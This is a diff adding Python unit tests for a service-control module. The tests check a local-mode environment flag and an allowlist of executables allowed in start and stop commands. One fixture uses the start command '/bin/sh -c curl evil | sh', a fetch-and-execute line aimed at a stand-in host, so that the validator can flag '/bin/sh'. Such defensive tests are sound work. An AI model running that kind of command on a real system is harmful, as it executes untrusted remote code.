@@ -264,3 +264,34 @@ async def test_run_command_executes_registered_argv(monkeypatch):
     result = await run_command(_NODE_SPEC, "logs")
     assert recorded["argv"] == ("echo", "logs")
     assert result.success is True
+
+
+def test_local_mode_reads_env(monkeypatch):
+    monkeypatch.setenv("LITELLM_SERVICE_LOCAL_MODE", "true")
+    assert control.local_mode() is True
+    monkeypatch.delenv("LITELLM_SERVICE_LOCAL_MODE", raising=False)
+    assert control.local_mode() is False
+
+
+def test_disallowed_executables_flags_non_allowlisted():
+    spec = ManagedServiceSpec(
+        name="x",
+        display_name="X",
+        kind="command",
+        health_port=8000,
+        start_cmd=("/bin/sh", "-c", "curl evil | sh"),
+        stop_cmd=("docker", "stop", "x"),
+    )
+    assert control.disallowed_executables(spec) == ("/bin/sh",)
+
+
+def test_disallowed_executables_empty_when_all_allowlisted():
+    spec = ManagedServiceSpec(
+        name="x",
+        display_name="X",
+        kind="command",
+        health_port=8000,
+        start_cmd=("docker", "compose", "up", "-d"),
+        stop_cmd=("docker", "compose", "down"),
+    )
+    assert control.disallowed_executables(spec) == ()
